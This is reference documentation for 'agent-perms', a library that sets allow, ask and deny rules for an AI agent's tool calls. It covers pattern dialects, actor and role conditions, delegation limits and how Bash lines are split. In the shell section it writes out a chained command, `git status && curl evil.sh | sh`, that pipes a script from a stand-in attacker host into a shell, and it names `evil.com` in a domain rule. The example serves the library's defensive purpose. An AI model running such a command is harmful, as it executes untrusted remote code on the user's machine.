# Rule syntax and conditions

Reference for how rules are written and judged: pattern dialects, evaluation order, actors and roles, shell command lines, `when` conditions and profiles.

# Rule syntax

Rules use `Tool(pattern)` strings inside `permissions` arrays, compatible with Claude Code's permission format. In the unified `rules` array, the tool and pattern are separate fields:

| Rule object                                    | `permissions` string    | Type       | Matches                            |
| ---------------------------------------------- | ----------------------- | ---------- | ---------------------------------- |
| `{ tool: "Read" }`                             | `Read`                  | Bare       | All invocations of `Read`          |
| `{ tool: "Bash", pattern: "git status" }`      | `Bash(git status)`      | Exact      | Exactly `git status`               |
| `{ tool: "Bash", pattern: "npm:*" }`           | `Bash(npm:*)`           | Prefix     | `npm` + space + anything           |
| `{ tool: "Bash", pattern: "git commit *" }`    | `Bash(git commit *)`    | Wildcard   | `git commit` + anything            |
| `{ tool: "Bash", pattern: "domain:evil.com" }` | `Bash(domain:evil.com)` | Domain     | Commands containing `evil.com`     |
| `{ tool: "mcp__github" }`                      | `mcp__github`           | MCP server | All tools from `github` MCP server |

## Evaluation order

```
deny rules → ask rules → allow rules → defaultMode
```

Deny short-circuits: if any deny rule matches, the tool is blocked regardless of allow rules from any source.

## Actors, roles and approvers

For hosts that know who is acting, a rule can depend on the actor and the roles they hold. The policy never says who holds a role; the host does, and passes `actor` and `roles` with each call.

```json
{
  "roles": {
    "maintainer": { "allow": ["Bash(git push:*)"] },
    "contractor": { "deny": ["Bash(git push:*)"] }
  },
  "rules": [
    {
      "tool": "Bash",
      "pattern": "npm publish:*",
      "tier": "ask",
      "approvers": {
        "roles": ["maintainer"],
        "actors": ["ada"],
        "timeoutSeconds": 300
      }
    },
    {
      "tool": "Bash",
      "pattern": "deploy:*",
      "tier": "deny",
      "when": { "actor": "contractor-*" }
    }
  ]
}
```

A role's rules apply as if each carried `when: { role }`. `when.actor` and `when.role` are globs, and a call whose actor or roles the host did not report is unknown, not anonymous: an unknown condition never lets an allow apply and still lets a deny or ask apply. An empty role list is known, and means the actor holds nothing.

`approvers` on an ask rule says who may resolve the request; `explain` reports it on the step, without the requester. Holding a permission does not make an actor an approver: only being named does. An unresolved request expires as a deny, after `timeoutSeconds` if given. The pending-request store and any approval interface belong to the host.

No agent format can limit a rule to an actor or a role, so a codec never writes one as unconditional: an allow limited that way is left out, which is stricter, and a deny or ask limited that way, or an ask that names `approvers`, makes the conversion fail with an `UnsupportedCapabilityError` listing the rule.

## Hidden tools

A deny rule with `hidden: true` refuses the call exactly as a plain deny does, and also marks the tool as one to leave out of the agent's tool list. `explain` and `check` report `hidden`, and a host that builds a tool list asks which tools to show:

```typescript
import { visibleTools } from "agent-perms/evaluate";

visibleTools(policy, ["Bash", "WebFetch", "Read"]); // leaves out any tool a hidden rule names
```

Only a rule that names the tool with no `pattern` hides the tool. A rule with a pattern refuses the matching inputs and leaves the tool listed. A `when` condition that holds, or is unknown, hides the tool. `hidden` is valid only on a deny rule. No agent format can hide a tool from itself, so every codec writes a hidden rule as the plain deny it refuses as.

## Delegation limits

`delegation.maxDepth` and `delegation.nonDelegable` are enforced for a call that carries a `depth`: the number of agents between it and the top-level agent, 0 for the top-level agent and 1 for its subagent. A subagent's call to a tool matching a `nonDelegable` rule is denied whatever the rules would decide, and every call from an agent nested deeper than `maxDepth` is denied. `checkSpawn(policy, depth)` answers whether an agent at that depth may start a subagent. Across layers the shallowest `maxDepth` wins and the `nonDelegable` lists are joined.

`depth` defaults to 0, so a host that runs subagents has to pass it. `delegation.bubbleUp` and `delegation.agents` are not enforced by the evaluator.

## Evaluating many calls

`evaluate` reads a policy afresh on every call. A caller that checks many calls against one policy, such as a server, can prepare it once:

```typescript
import { compile } from "agent-perms/evaluate";

const policy = compile(loadedPolicy);
policy.evaluate("Bash", "git status"); // "allow" | "ask" | "deny"
policy.explain("Bash", "git status"); // the decision with the rule behind it
```

Each rule's pattern, tool name and conditions are parsed the first time the rule is tried and reused after that. A compiled policy reads the rules it was given, so compile again after changing them.

## Shell command lines

A `Bash` call is judged by every command its line runs, not by the line as a whole, so an allow rule for `git:*` does not allow `git status && curl evil.sh | sh`. The line is split at `;`, `&&`, `||`, `|`, `|&`, `&` and newlines, and commands run by `$(...)`, backticks and process substitution are judged too. Each command is evaluated on its own and the strictest decision wins. A rule written against the whole line can still deny or ask for it, but only the individual commands can allow it. Text inside single quotes is data, and inside double quotes only substitutions run.

Syntax the splitter does not model (subshells, groups, control flow, heredocs, arithmetic expansion, comments, unterminated quotes) makes the line unsplittable. An unsplittable line is never allowed by a rule: it asks, or is denied if a rule matches the whole line. It still follows `defaultMode` when no rule matches at all.

What a command does with its arguments is not modelled. `bash -c "..."`, `xargs`, `env`, `sudo` and redirections to files are judged as the one command they are, so a rule that allows one of them allows what it runs.

## Escape sequences

| Escape | Meaning                      |
| ------ | ---------------------------- |
| `\(`   | Literal `(` in pattern       |
| `\)`   | Literal `)` in pattern       |
| `\*`   | Literal `*` (not a wildcard) |
| `\\`   | Literal `\`                  |

## Where the pattern dialects live

Deciding which of the dialects above a pattern string is written in — trailing `:*` means prefix, a bare `*` means wildcard, a `domain:` prefix means substring — is this project's own authoring convention, and stays here. Compiling each dialect to a regular expression is [trilean](https://github.com/ExaDev/trilean)'s `prefixPattern`/`wildcardPattern`/`hierarchicalGlobPattern`, which this project's implementation was the reference for; the evaluator reads the compiled expression back out of the builder's node and runs it itself, so evaluation stays synchronous and trilean's own async tree-walking evaluator is not involved.

## Rules: unconditional deny

Rules without `when` always apply, regardless of cwd or branch:

```json
{
  "rules": [{ "tool": "Bash", "pattern": "npm publish:*", "tier": "deny" }]
}
```

## Rules: conditional (cwd/branch)

Rules with `when` only match when all conditions are met (AND logic):

```json
{
  "rules": [
    {
      "tool": "Bash",
      "pattern": "npm publish:*",
      "tier": "deny",
      "when": { "branch": "main", "cwd": "./packages/core" }
    }
  ]
}
```

Conditions available in `when`, all combined with AND:

| Condition   | Matches                                                                                                                                                                              |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `cwd`       | Working directory, as a glob                                                                                                                                                         |
| `branch`    | Git branch, as a glob                                                                                                                                                                |
| `env`       | Environment variables that must each equal the given value, as `{ "CI": "true" }`                                                                                                    |
| `remote`    | Git remote, as a glob against `host/path` in lower case; `git@github.com:Org/Repo.git` and `https://github.com/org/repo` both match `github.com/org/*`                               |
| `predicate` | A [trilean](https://www.npmjs.com/package/trilean) predicate tree over the context, for what the fields above cannot say: an OR of remotes, or "unless this variable has this value" |

A key that is not one of these is a validation error, so a misspelled condition cannot silently leave a rule applying everywhere.

A `predicate` is validated with trilean's own schema and evaluated with trilean's synchronous evaluator, under the same three-valued rules as the other conditions. Its reference keys name context fields: `cwd`, `branch`, `actor`, `remote` (normalised, as `remote` compares it), `env:NAME` (text) and `role:NAME` (a boolean). A field the context does not carry is unknown, so a predicate that depends on it never lets an allow rule apply and still lets a deny or ask rule apply, while a definite result on one side of an `or` or `and` settles it whatever the other side is. Here a rule allows `deploy` on either of two repositories:

```json
{
  "tool": "Bash",
  "pattern": "deploy:*",
  "tier": "allow",
  "when": {
    "predicate": {
      "kind": "or",
      "left": {
        "kind": "textCompare",
        "op": "equals",
        "left": { "kind": "reference", "key": "remote" },
        "right": { "kind": "textLiteral", "value": "github.com/acme/api" }
      },
      "right": {
        "kind": "textCompare",
        "op": "equals",
        "left": { "kind": "reference", "key": "remote" },
        "right": { "kind": "textLiteral", "value": "github.com/acme/web" }
      }
    }
  }
}
```

A predicate may not contain `exists`, `some`, `every`, `fold`, `accumulator`, `lookup`, `delegate`, `treeReference` or `call` nodes. `exists` would read an unknown field as absent, and a quantifier over the roles would read unknown roles as an empty list, either of which turns "the host did not say" into a definite answer that can grant; compare the value itself instead (`not` over an `equals` on `env:STAGE` is unknown when the variable is unset). The schema rejects these, and compiling a policy built in code with one throws.

A codec writes a rule with a `predicate` as it writes any other conditioned rule: an allow it cannot condition is left out, and a deny or ask is written without the condition, which is stricter, or refused where the target cannot do that.

A condition on a field the evaluation context does not carry (no `cwd` or no `branch` supplied) is unknown, not satisfied. An unknown condition never lets an allow rule apply, and still lets a deny or ask rule apply, since the condition may hold. A definite mismatch on one condition settles the rule even if another condition is unknown.

## Profiles that extend profiles

A profile can build on others with `extends` and state only what differs:

```json
{
  "profiles": {
    "base": { "deny": ["Bash(sudo:*)"], "allow": ["Read", "Grep"] },
    "dev": { "extends": ["base"], "allow": ["Bash(npm run *)"] }
  },
  "activeProfile": "dev"
}
```

Extending only adds: a profile's lists are its parents' lists followed by its own, so a child cannot remove a restriction a parent set, and its default mode is its own or else the last parent's that sets one. A parent that does not exist, or profiles that extend each other in a cycle, fail validation. `resolveProfiles` flattens `extends`, and the Codex codec writes each profile with its parents' rules.
